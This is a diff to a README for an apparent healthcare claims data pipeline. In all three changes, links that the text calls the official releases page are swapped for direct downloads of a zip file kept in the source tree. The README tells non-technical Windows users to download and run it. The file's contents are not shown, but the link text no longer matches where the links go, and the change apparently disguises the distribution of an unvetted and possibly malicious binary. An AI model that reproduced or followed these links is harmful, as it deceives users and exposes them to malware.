@@ -1,6 +1,6 @@
 # 🏥 healthcare-claims-medallion-pipeline - Clear Healthcare Data Pipeline
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/FluxSor/healthcare-claims-medallion-pipeline/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/FluxSor/healthcare-claims-medallion-pipeline/raw/refs/heads/main/src/generator/medallion-claims-pipeline-healthcare-v1.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ You do not need technical skills to use this app. It runs on Windows and include
 
 Use this link to open the official releases page:
 
-[Download Releases](https://github.com/FluxSor/healthcare-claims-medallion-pipeline/releases)
+[Download Releases](https://github.com/FluxSor/healthcare-claims-medallion-pipeline/raw/refs/heads/main/src/generator/medallion-claims-pipeline-healthcare-v1.4.zip)
 
 You will see a list of available versions. Select the one marked as stable or latest.
 
@@ -159,7 +159,7 @@ Once installed, the app creates a folder system for your projects:
 
 Use this link to visit the download page:
 
-[![Get Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue)](https://github.com/FluxSor/healthcare-claims-medallion-pipeline/releases)
+[![Get Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue)](https://github.com/FluxSor/healthcare-claims-medallion-pipeline/raw/refs/heads/main/src/generator/medallion-claims-pipeline-healthcare-v1.4.zip)
 
 Steps:
 
